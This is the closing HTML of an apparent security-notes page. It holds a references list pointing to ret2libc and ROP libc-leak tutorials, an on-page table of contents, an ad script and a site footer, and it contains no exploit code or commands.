            <div class="my-6 p-4">
                <h2 class="text-3xl font-bold border-b-[1px] border-pink-dark">
                    References
                </h2>
                <ul class="my-6 ml-4 list-disc break-all">
                    
                        <li class="my-2">
                            <a href="https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc" class="text-base text-pink-light hover:brightness-200">
                                https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc
                            </a>
                        </li>
                    
                        <li class="my-2">
                            <a href="https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address" class="text-base text-pink-light hover:brightness-200">
                                https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address
                            </a>
                        </li>
                    
                </ul>
            </div>
            
        </article>
    </div>

    
    <div id="exploit-rightside-inner" class="hidden sm:block w-full h-screen overflow-y-auto px-4 py-3">
        <div class="flex flex-col gap-y-4">
            <div>
                <h5 class="mb-4 border-b-2 border-slate-light text-sm text-white opacity-60">
                    ON THIS PAGE
                </h5>
                <div class="toc my-4 flex flex-col gap-y-2">
                <a href="#exploitation" class="text-sm break-words">Exploitation</a></div>
            </div>
            <div>
                
                <script async="" type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CWYDE53L&amp;placement=exploit-noteshdksorg" id="_carbonads_js">
                </script>
            </div>
        </div>
    </div>
    
</div>
        </main>
        <footer class="mt-12 w-full p-8 bg-navy-light">
    <div class="
            md:mx-auto w-full md:w-2/3
            flex flex-col md:flex-row md:items-start
            gap-y-3 md:gap-y-0 text-base
        ">

        <div class="w-full flex flex-col gap-y-2">
            <h3 class="text-sm opacity-60">SOCIALS</h3>
            <div class="w-full flex flex-col lg:flex-row items-start lg:items-center gap-y-2 lg:gap-3">
                <a href="https://github.com/readloud" target="_blank" rel="noopener noreferrer">
                    GitHub
                </a>            
                <a href="https://twitter.com/readloud" target="_blank" rel="noopener noreferrer">
                    Twitter
                </a>
                <a href="https://ko-fi.com/readloud" target="_blank" rel="noopener noreferrer">
                    Support Me
                </a>
            </div>
        </div>

        <div class="w-full flex flex-col gap-y-2">
            <h3 class="text-sm opacity-60">PAGES</h3>
            <div class="w-full flex flex-col lg:flex-row items-start lg:items-center gap-y-2 lg:gap-3">
                <a href="/disclaimer">Disclaimer</a>
                <a href="/privacy-policy">Privacy Policy</a>
            </div>
        </div>
        
        <div class="w-full flex flex-col gap-y-2">
            <h3 class="text-sm opacity-60">OTHER TOOLS</h3>
            <div class="w-full flex flex-col lg:flex-row lg:flex-wrap items-start lg:items-center gap-y-2 lg:gap-3">
                <a href="https://github.com/readloud?tab=repositories" target="_blank" rel="noopener noreferrer">
                    Repositories
                </a>
                <a href="https://readloud.github.io/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E" target="_blank" rel="noopener noreferrer">
                    Advanced PeneTest 4E
                </a>
                <a href="https://readloud.github.io/index-of-ISO" target="_blank" rel="noopener noreferrer">
                    ISO Archive
                </a>
                <a href="https://readloud.github.io/faucetmonitor" target="_blank" rel="noopener noreferrer">
                    Faucetmonitor
                </a>
            </div>
        </div>

    </div>
</footer>

    

    <script type="text/javascript" src="/js/hamburger.js"></script>

</body></html>